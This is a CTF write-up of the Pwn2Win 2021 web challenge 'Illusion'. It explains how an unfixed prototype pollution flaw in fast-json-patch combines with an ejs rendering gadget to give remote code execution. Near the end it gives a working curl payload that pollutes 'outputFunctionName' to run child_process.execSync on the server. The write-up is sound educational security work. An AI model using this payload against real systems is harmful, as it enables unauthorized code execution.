# Pwn2Win CTF 2021 [web] Illusion writeup

## Challenge

Laura just found a website used for monitoring security mechanisms on Rhiza's state and is planning to hack into it to forge the status of these security services. After that she will desactivate these security resources without alerting government agents. Your goal is to get into the server to change the monitoring service behavior.

Server: `nc illusion.pwn2win.party 1337`

## Solution

This is a simple web application that stores the status of services.

You have to execute `./readflag` to get the flag.

There is an API that can modify the status of services.

```javascript
// API
app.post("/change_status", (req, res) => {

    let patch = []

    Object.entries(req.body).forEach(([service, status]) => {

        if (service === "status"){
            res.status(400).end("Cannot change all services status")
            return
        }

        patch.push({
            "op": "replace",
            "path": "/" + service,
            "value": status
        })
    });

    jsonpatch.applyPatch(services, patch)

    if ("offline" in Object.values(services)){
        services.status = "offline"
    }

    res.json(services)
})
```

```
curl -i -X POST \
  http://localhost:1337/change_status \
  --header "Content-type: application/json" \
  --data '{"cameras": "online","doors": "online","dome": "online","turrets": "offline"}'
```

Now, at first glance, these do not appear to be vulnerable.

And all the npm packages used seem to be up to date.

```json
{
  "dependencies": {
    "ejs": "^3.1.6",
    "express": "^4.17.1",
    "express-basic-auth": "^1.2.0",
    "fast-json-patch": "^3.0.0-1"
  }
}
```

However, if you check the package [fast-json-patch](https://github.com/Starcounter-Jack/JSON-Patch), you will find a Prototype Pollution vulnerability that is unfixed.

[Security Fix for Prototype Pollution - Starcounter-Jack/JSON-Patch](https://github.com/Starcounter-Jack/JSON-Patch/pull/262)

This web application uses `ejs`, which is known to be capable of RCE by Prototype Pollution.

[Unrestricted render option may lead to a RCE vulnerability - mde/ejs](https://github.com/mde/ejs/issues/451)

All the parts are in place. Here's the exploit code.

```sh
curl -i -X POST \
  http://admin:xxxx@illusion.pwn2win.party:1337/change_status \
  --header "Content-type: application/json" \
  --data '{"constructor/prototype/outputFunctionName": "a; return global.process.mainModule.constructor._load(\"child_process\").execSync(\"./readflag\"); //"}'

curl http://admin:xxxx@illusion.pwn2win.party:1337/
```

```
CTF-BR{d0nt_miX_pr0totyPe_pol1ution_w1th_a_t3mplat3_3ng1nE!}
```
